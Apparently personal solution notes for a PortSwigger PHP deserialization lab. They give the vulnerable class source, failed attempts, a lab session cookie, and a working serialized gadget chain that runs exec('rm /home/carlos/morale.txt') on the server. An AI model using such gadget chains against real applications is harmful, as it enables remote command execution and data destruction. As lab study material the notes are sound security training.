<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>




https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization





final payload:
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}


failed tries (all of them are missing : before {}... deserialized failed)
O:10:"DefaultMap":1{s:4:"name";s:26:"rm /home/carlos/morale.txt";}
O:7:"Product":1{s:4:"desc";s:26:"rm /home/carlos/morale.txt";}
O:14:"CustomTemplate":1{O:11:"Description":1{s:9:"HTML_DESC";s:26:"rm /home/carlos/morale.txt";}}
O:14:"CustomTemplate":1{s:7:"product";s:26:"rm /home/carlos/morale.txt";}
O:11:"Description":2{s:9:"HTML_DESC";s:26:"rm /home/carlos/morale.txt";s:9:"TEXT_DESC";s:26:"rm /home/carlos/morale.txt";}

O:??:"__??":1{s:??:"__??";s:26:"rm /home/carlos/morale.txt";}

O:riginal.cookie:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"z2yba2voolwc6n1k5rty1v44qvl2hxsj";}


previous labs:
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}